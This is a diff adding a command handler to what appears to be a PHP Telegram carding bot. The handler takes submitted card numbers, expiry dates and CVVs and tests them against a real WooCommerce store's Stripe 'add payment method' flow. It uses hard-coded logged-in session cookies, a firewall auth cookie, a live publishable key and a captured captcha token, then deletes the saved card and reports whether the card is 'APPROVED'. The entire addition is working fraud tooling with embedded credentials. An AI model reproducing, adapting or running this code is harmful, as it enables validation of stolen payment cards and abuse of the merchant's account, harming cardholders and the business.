@@ -2556,6 +2556,227 @@ ob_flush();
 
 
 
+elseif((strpos($message, "!wo") === 0)||(strpos($message, "/wo") === 0)||(strpos($message, ".wo") === 0)){
+$lista = substr($message, 4);
+$i = preg_split('/[|:| ]/', $lista);                                  
+$cc    = $i[0];
+$mes   = $i[1];
+$ano  = trim(substr($i[2], -2));
+$cvv   = $i[3];
+$bin = substr($lista, 0, 6);                                        
+$num = "$cc$mes$ano1$cvv";
+//-----------------------------------------------------//
+$longitud = 4;
+$partes = [];
+for ($i = 0; $i < strlen($cc); $i += $longitud) {
+    $parte = substr($cc, $i, $longitud);
+    $partes[] = $parte;                                               }
+
+
+$verify = substr($cc, 16, 1);
+        if($verify != ""){
+                $respuesta = "🚫 Oops!\nUse this format: /wo CC|MM|YYYY|CVV\n";
+        //        $respuesta = "🚫Invalid CC🚫\n";                                   
+		sendMessage($chat_id,$respuesta, $message_id);
+                die();
+}
+
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+
+}else{
+        $respuesta = "🚫 Oops!\nUse this format: /wo CC|MM|YYYY|CVV\n";
+        sendMessage($chat_id,$respuesta, $message_id);
+        die();
+}
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+        //----------------------------------------------------//
+
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/add-payment-method/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-29%2023%3A03%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-29%2023%3A03%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1734131115%7C2ThTCJdem39Q0CojYMabP972QLcBf5XZQW99FQW94Jl%7C4e607270a11ce05e4c67196a818ec170da73fb948d16d97cb1cad5dd2d9482a8; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7C864377e38d3dc49c482fe02981c9463d1d2789c7f826cc8de9b6a3cf0afd1495; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f; __stripe_sid=c612c1cf-7043-4033-a3a4-707d9a95ee86ae4b50',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'referer: https://www.hollywoodexpendables.com/my-account/payment-methods/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/';
+preg_match($patron, $response, $coincidencias);
+$nonce = $coincidencias[1];
+curl_close($curl);
+
+
+$cc = implode('+', $partes);
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.hollywoodexpendables.com&time_on_page=18903&client_attribution_metadata%5Bclient_session_id%5D=008b43a2-a8b7-45f0-9b09-1890f4f8e465&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=95418e46-44e6-4c69-891e-21864d35f38732afd7&muid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f&sid=c612c1cf-7043-4033-a3a4-707d9a95ee86ae4b50&key=pk_live_3aQeYWJrvX0nCYSR0VstU8rL&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoia01UbHQzK2wwTHBGWEFlZWRXd1lVNU1lNU84RGFPUVFhMFI3WUJxUDJ1Q2lvTXB0MEhXVEQvT3hZU05JVG1VOXhZelM3czh0aGl5ZVF0aXFrdHAzMVVoL1FmT1dUUFpkZkpya3ZwS1dVS2JmUUlQcGdIbjVFdmdSTFBZeVFMT1ZiaXRLMXlyYWtrbmM0d1c3MTA5MEdTK2sybzRkbkdaUm96SExBampxb3l3Und5ZGRpV0dHQWNlTzVqemVqYXFYRnpzS0ZQbGVFSVZvalVvYzM5ZFF2QUc5aHZ5ckdBOEVtNkhtemtTUTlCKzZFamNIN2RJUURDb05FM0o0V3ZVVEFiZU9Xb0VhZy9vNmM3clRBUDdNeWRRekcwN3V1Wk9EcWhqNHQxdENxa0xiQ290a2xXT1gxWjRpSTc0VnpzZmVMd2RJOUYzY2YvVy9hdDZVTll0dGRaNzVMUFdwb05UZTZVcllma2dkelF6cGZpa1A1ditVRGpOZk9CdTVCR050OUdVOVNrY1VCL3dySmJYR2tqWnE1YkdESTRrNzQ2TkpvYmx5ZS9RYThLM2JROVFsZ3paQzQzRE1DQVp5b0dyTkwxOEZCdHRKWVVFK2lleVR4QTVyNkIxZFgzUnlva0JYRms0ak9zcm4vdHM1b3JMOEdhazZad09LQ3RWcHlHWFVFTUJRZlNPTzNmZnM1UEY5RG05R1ZjVXo5VllLUEp5SVRxNjB5WXlmSyt4RjFwWkVwb3RyTDMwVmYrcFZyN3BuWGw1R0R3YTlES1BaS2Z1aWR4cEsycHh4MXgxMGVjMVRPdEV3NmhPMHpIeVlqUFJsL282a0sxOGJYbUsyZmRGbkY0eUc3NVZEQlp5OWFkTzJnSzF5akxHZzhNYml6WUI4bFhFY09NNjA0YUhSc0hHVmRjQnQ4T283dDFXL0Q0cjdpbXJja08zam41andBdW9uTE1TMTVmUlBYbzhISVRUbFkwSkFVSFlPUzZiditXVWFBU1VyY0VHcHpIbVlDSnpYd3RqdXRpc0hnb0ZVTEpuUGJReDE3M3BEcy8wQUxERVZoNEc1MkRmN1FRUGp5S1F0WXBhTjFkcFgxRDZSRnluWVZvLzVqVHBMYUs3U1lmdkxSN1QyeTFWaWJjOFBhODVJMGg5RklXbVloVkk2cW5qSzF6emJPY2YyK3BsUjFsOTdSRjM5dnR3VDh1Q2ducDZvN1lDYUVDK3V4b1lLRzIvcDF1NkR0NXY1V3UwWGdFeU9GeityMVBPRkloOUtDdXVIK3VCRlBVaVhINUJpZ2c5cjlZL2hFclBzbFc3SnNpU3BhMjNiOGlPdFN2dXlNZVEwTEsvc2hPQVFRQkc5aVA0MnJXc0Q5dVJCR0xYd1FFUmRJRzBxOEpUQlgzSGZLWXlxREYweHRtbnpDVjR0TU1IQ09BRnNsVENaRFJZTmZQSjJnTndaZ2ZUMzhhamZnN0hETnFQQW9ndHljaFZ5aDFTTGh3QmhrQ2V0eFp1UXdwMlBvZXZXOEV5V244WHhiZFhFUU1JN3RjOGtwd3JzWW5jN2dWdHVOZEpaQmRDVGJjWFZMSjZpbVhGa28xSzRVTVozcFdqZ3dmcGJlbHhhWnI1VDJhVUs4Z29MUHc0MHZFRVVaRGtPL002T0h4aitTdHpEOVBUVWhSei9BMWo5R2pVQ255YnphOTQrdElzNkd1eU54T3pVbWlyZ3plM3haL3BEOW9qTGRZSmgvWGx2TGtISk4xWXU3RXRjNnFhVDVCOTZ2dFBEa1FQcC8yZS9LVWMreDFsUjVCbUNpY3h4WnExL3B0VnRIL21mZmJLVStCUGg4R1cybHlIYUI5dGNhQUFvU2l1U3hMWVJTdEt6VjlreUFUeDUrTVFncmx1YkVtTG5GYnlkTEE4ejNaVXpjRlJhclVJNkNGMEE0eDhtaGxRa3ZaOE1mMWZiWkFFOVl4Mm0yS1plMmtyNHJDOXBOS2l5NTZuOW40cm0zUSthSC9kQUZSQll1eHFpcW5Lb3hLRUR3ZWVvM3dYZVRGZm1pMjRhbDk5YnRWajViZXNvR2d4SHYzdG9zWUNsQmlsR0x0bURSK3JKL2VBNGdxdTVQSDZGYkVGcW1ka1FVRHFiT0dzRW5NMG42ZUcrNGFJaVZtdnMyV2JtS1M3UkJ4NGthb0huWEhoaHhqcFNhUGdLcUlObFViM3l6L2pIUFhvT2N5VkJ6QUFBWk9hNE16TURzMkdtL1VES0Y1RlY0bWQ2aHUwN1BzZnV0QVZUVDhJcVBKMlRJb2IzcU4zTTBHR3MrU0ZrMks5cFcrSENZVGw3Z0wrMDVKN1Z6WHVZOUZ6RDE5cXNFd0puc0FPRW9jRktFRnZDRmZGeFB3VUlQMDZSaGRpdzdhM09TdUUwbVd5RlVoWXRlWWwzUXBEUllvNzhFK1poQVBjTDkzUHFrMDhSUG9tdnNyQ2xic1hXbWc1MmxlK05UQXpoblVkSkRWRVdrTHFvVDVUSG0yangyK05SYndhSUNadzRNUVhtQWREYnVMMXVzc2wzYXlEalhJcCtWSDhlRkdnbk4yTmJYWEhCQkhXWExheUU1a1hVVEQyTEUvcHpBbDJuNno4TVQrSGlJSWhhMmtvK0wzeDlZNUNuRGMxa1FtN2ZpUTVTL25DeXllODE1eFlNRXhaVmhHZmJ1RFlKQ3V5Y0dXdUlnbDJBamt2cnJETzdYYUNqY04vQlRiWW1MTjFZY0FYV09pTXozbXFONjc2UzFyVE04a1liV0pSMitLbEk3QVlGSHkyeDFFREppUUhuVnprQ0FzTHZhK0lqV3IxQzV2RjZsQjZCemw1REtRZz0iLCJleHAiOjE3MzI5MjE2NzMsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWQ5Yjk2ODAiLCJwZCI6MCwiY2RhdGEiOiJXMEt3TjBuajJHeVhaR05VVW9oSXQ5OHRhaXpObkgvUEpRREY4cXFtWEl0aDEyQ0tINUhZMjFBQWZHWUpsSy9qa0JScWx1cjVHSGJNcFB5Nkpna0FaQk5leVF4U1U0RWhXQVhZaC9VSWNDaHpwZlpDUE9VdHVFdUhkbTg0WEtuR0UwbE9mSVZQRXQ3NlhhZ0pGNGdnb1JTTDZlRnJIMlk4VkJiTHh3WEorclVGaC9lMzRBUS9WSGZKa29yTkU3SFpTYi9XMWVZaXZXZVhyL3FKIn0.AidX1i7r-8V-dch752wixFQBUYHpae7vXp5Y9armNnc',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Accept: application/json',
+    'Content-Type: application/x-www-form-urlencoded',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://js.stripe.com',
+    'referer: https://js.stripe.com/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$id = $json['id'];
+curl_close($curl);
+
+
+$curl = curl_init();
+
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.hollywoodexpendables.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-29%2023%3A03%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-29%2023%3A03%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1734131115%7C2ThTCJdem39Q0CojYMabP972QLcBf5XZQW99FQW94Jl%7C4e607270a11ce05e4c67196a818ec170da73fb948d16d97cb1cad5dd2d9482a8; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7C864377e38d3dc49c482fe02981c9463d1d2789c7f826cc8de9b6a3cf0afd1495; __stripe_mid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f; __stripe_sid=c612c1cf-7043-4033-a3a4-707d9a95ee86ae4b50; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'x-requested-with: XMLHttpRequest',
+    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'origin: https://www.hollywoodexpendables.com',
+    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$message = str_replace("Error: ", "", $json['data']['error']['message']);
+$success = $json['success'];
+$status = $json['data']['status'];
+curl_close($curl);
+
+if ($success === true && $status === "succeeded") {
+    $respo = "1000: Approved!";
+
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/payment-methods/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1734131115%7C2ThTCJdem39Q0CojYMabP972QLcBf5XZQW99FQW94Jl%7C4e607270a11ce05e4c67196a818ec170da73fb948d16d97cb1cad5dd2d9482a8; __stripe_mid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Ce3130a0c99e501a87dca9f9fb17be96eaa3653a392f210f689c542dffcf2df01; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-30%2018%3A05%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-30%2018%3A05%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; __stripe_sid=c266cac5-c33e-46f6-84b4-84c82e9402350770fb',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
+preg_match($patron, $response, $coincidencias);
+$url_nonce = $coincidencias[0];
+curl_close($curl);
+
+echo "$url_nonce\n";
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/delete-payment-method'.$url_nonce.'',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1734131115%7C2ThTCJdem39Q0CojYMabP972QLcBf5XZQW99FQW94Jl%7C4e607270a11ce05e4c67196a818ec170da73fb948d16d97cb1cad5dd2d9482a8; __stripe_mid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Ce3130a0c99e501a87dca9f9fb17be96eaa3653a392f210f689c542dffcf2df01; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-30%2018%3A05%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-30%2018%3A05%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=c266cac5-c33e-46f6-84b4-84c82e9402350770fb; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://www.hollywoodexpendables.com/my-account/payment-methods/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+
+} elseif ($success === true && $status === "requires_action") {
+    $respo = "3DS Authenticate Rejected ❌";
+} else {
+    $respo = $message;
+}
+
+
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+
+
+if (empty($respo)) {
+        $respo = $response;
+}
+
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = True;
+} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+} else {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+}
+
+if ($live) {
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+}
+	
+
 elseif((strpos($message, "!ho") === 0)||(strpos($message, "/ho") === 0)||(strpos($message, ".ho") === 0)){
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
